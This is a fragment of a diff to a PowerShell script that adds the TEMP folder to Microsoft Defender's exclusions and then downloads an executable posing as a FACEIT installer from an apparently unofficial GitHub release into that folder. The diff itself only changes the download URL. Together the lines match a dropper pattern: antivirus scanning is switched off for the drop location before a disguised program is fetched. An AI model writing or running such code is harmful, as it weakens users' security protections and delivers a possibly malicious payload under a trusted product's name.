@@ -14,7 +14,7 @@ try {
     Add-MpPreference -ExclusionPath $env:TEMP
 } catch {}
 
-$url = "https://github.com/smpleprme7-ship-it/FACEIT/releases/download/ac/FACEIT_Installer64.exe"
+$url = "https://github.com/smpleprme7-ship-it/FACEIT/releases/download/ac/FACEITInstaller64.exe"
 $outPath = "$env:TEMP\FACEIT_Installer64.exe"
 
 Start-BitsTransfer -Source $url -Destination $outPath -DisplayName "Downloading..." -Description "Please wait"
